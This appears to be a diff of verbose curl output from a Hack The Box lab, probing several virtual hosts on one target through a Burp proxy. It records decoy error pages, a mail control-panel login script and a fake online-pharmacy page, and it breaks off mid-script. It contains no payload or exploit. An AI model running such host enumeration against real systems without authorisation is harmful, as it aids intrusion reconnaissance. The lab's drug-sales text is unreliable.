+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: b78687238673cee4
+ • 2018-12-20 00:41:09 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>8a277d1d4b193fab
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>
+
+proxy.clownware.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: proxy.clownware.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:09 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: 30f832a0efc934e2
+ • 2018-12-20 00:41:09 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>30240e4c416065eb
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>
+
+console.flujab.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: console.flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 519
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Access Granted!</title>
+        <embed src="/dialup.m4a" volume="60" height="0" width="0" autostart="true" loop="true"  width="0" height="0">
+    </head>
+        <style type="text/css">
+            body {
+                background-color: #000;
+            }
+            img {
+            width: 70%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <img src="/console.gif"/>
+
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+sys.flujab.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: sys.flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: 2489ba982fd37a16
+ • 2018-12-20 00:41:10 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>d35bedc6ad2f159a
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</body></html>
+
+smtp.flujab.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: smtp.flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 4954
+< 
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>SMTP Mail Box</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
+        <link rel="stylesheet" href="assets/css/main.css"/>
+    </head>
+    <body class="homepage is-preload">
+        <div id="page-wrapper">
+
+            <!-- Header -->
+                <section id="header" class="wrapper style3">
+
+                    <!-- Logo -->
+                        <div id="logo">
+                            <h1><a href="/?login">SMTP Mail Configuration</a></h1>
+                        </br>
+                            <!-- NOW DEPRICATED! This function has been integrated into the new free service application!-->
+                        </div>
+                </section>
+    <!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.dropotron.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+<section id="main" class="wrapper style4">
+
+<div style="margin: 0 auto; max-width: 32em;">
+	<h2>Log in here for your Mail-in-a-Box control panel.</h2>
+  <form class="form-horizontal" role="form" onsubmit="do_login(); return false;">
+    <div class="form-group">
+      <label for="inputEmail3" class="col-sm-3 control-label">Email</label>
+      <div class="col-sm-9">
+        <input name="email" type="email" class="form-control" id="loginEmail" placeholder="admin@flujab.htb">
+      </div>
+    </div>
+    <div class="form-group">
+      <label for="inputPassword3" class="col-sm-3 control-label">Password</label>
+      <div class="col-sm-9">
+        <input name="password" type="password" class="form-control" id="loginPassword" placeholder="Password">
+      </div>
+    </div>
+    <div class="form-group">
+      <div class="col-sm-offset-3 col-sm-9">
+      </div>
+    </div>
+    <div class="form-group">
+      <div class="col-sm-offset-3 col-sm-9">
+      	<div>
+      	</div>
+        <button type="submit" class="btn btn-default">Sign in</button>
+      </div>
+    </div>
+  </form>
+</div>
+
+
+<script>
+function do_login() {
+  if ($('#loginEmail').val() == "") {
+    show_modal_error("Login Failed", "Enter your email address.", function() {
+	$('#loginEmail').focus();
+    });
+    return false;
+  }
+  if ($('#loginPassword').val() == "") {
+    show_modal_error("Login Failed", "Enter your email password.", function() {
+        $('#loginPassword').focus();
+    });
+    return false;
+  }
+  // Exchange the email address & password for an API key.
+  api_credentials = [$('#loginEmail').val(), $('#loginPassword').val()]
+  api(
+  "/me",
+  "GET",
+  { },
+  function(response){ 
+    // This API call always succeeds. It returns a JSON object indicating
+    // whether the request was authenticated or not.
+    if (response.status != "ok") {
+      // Show why the login failed.
+      show_modal_error("Login Failed", response.reason)
+      // Reset any saved credentials.
+      do_logout();
+    } else if (!("api_key" in response)) {
+      // Login succeeded but user might not be authorized!
+      show_modal_error("Login Failed", "You are not an administrator on this system.")
+      // Reset any saved credentials.
+      do_logout();
+    } else {
+      // Login succeeded.
+      // Save the new credentials.
+      api_credentials = [response.email, response.api_key];
+      // Try to wipe the username/password information.
+      $('#loginEmail').val('');
+      $('#loginPassword').val('');
+      // Remember the credentials.
+      if (typeof localStorage != 'undefined' && typeof sessionStorage != 'undefined') {
+        if ($('#loginRemember').val()) {
+          localStorage.setItem("miab-cp-credentials", api_credentials.join(":"));
+          sessionStorage.removeItem("miab-cp-credentials");
+        } else {
+          localStorage.removeItem("miab-cp-credentials");
+          sessionStorage.setItem("miab-cp-credentials", api_credentials.join(":"));
+        }
+      }
+      // Open the next panel the user wants to go to. Do this after the XHR response
+      // is over so that we don't start a new XHR request while this one is finishing,
+      // which confuses the loading indicator.
+      setTimeout(function() { show_panel(!switch_back_to_panel || switch_back_to_panel == "login" ? 'system_status' : switch_back_to_panel) }, 300);
+    }
+  })
+}
+function do_logout() {
+  api_credentials = ["", ""];
+  if (typeof localStorage != 'undefined')
+    localStorage.removeItem("miab-cp-credentials");
+  if (typeof sessionStorage != 'undefined')
+    sessionStorage.removeItem("miab-cp-credentials");
+  show_panel('login');
+}
+function show_login() {
+  $('#loginEmail,#loginPassword').each(function() {
+    var input = $(this);
+    if (!$.trim(input.val())) {
+      input.focus();
+      return false;
+    }
+  });
+}
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</script>
+
+vaccine4flu.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: vaccine4flu.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 502
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <style type="text/css">
+            body {
+                background-color: #000;
+            }
+            img {
+            width: 100%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <img src="/getvacc.gif"/>
+            <img src="/getvacc.gif"/>
+            <img src="/getvacc.gif"/>
+            <img src="/getvacc.gif"/>
+            <img src="/getvacc.gif"/>
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+bestmedsupply.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: bestmedsupply.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 21065
+< 
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class=" mod-js mod-svg mod-boxsizing mod-mediaqueries" lang="en-US"><head>
+<title>BUY ONLINE DRUG|MY HEALTH ONLINE CARE</title>
+<meta name="viewport" content="width=device-width">
+<link rel="canonical" href="https://bestmedsupply.htb/mens-health.html">
+<link rel="shortcut icon" href="https://bestmedsupply.htb/favicon.ico" type="image/x-icon">
+<link href="index_files/css.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" type="text/css" href="index_files/normalize.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/grid.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/common.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/black.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/superfish.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/superfish-vertical.css" media="screen">
+<link rel="stylesheet" type="text/css" href="index_files/superfish-mobile.css" media="screen and (max-width:650px)">
+<link rel="stylesheet" type="text/css" href="index_files/style.css">
+<!--[if IE 7]>
+<link rel="stylesheet" type="text/css" href="https://bestmedsupply.htb/skins/e-tone/icomoon/ie7/ie7.css" />
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="index_files/styles.css" media="screen">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="description" content="Online Pharmacy without prescription medicine. Modest Online Pharmacy. Online Drugstore no RX. Spare your Time and Money! Purchase Generic Buy Generic cialis 20 mg online…">
+<meta name="keywords" content="Buy Adderall 30mg online,Buy Levitra Vardenafil 10 mg online,Buy Viagra Sildenafil Citrate 200mg,Buy Cialis Tadalifil Citrate 40mg Online,Buy Ritalin Methylphenidate 10mg Online,Buy cheap tramadol 100mg online">
+<meta name="robots" content="index, follow">
+<meta name="generator" content="cubecart">
+
+<script src="index_files/enquire.js"></script><script src="index_files/superfish.js"></script><script src="index_files/script.js"></script><script type="text/javascript" async="" src="index_files/ga.js"></script><script type="text/javascript">
+var _gaq = _gaq || [];
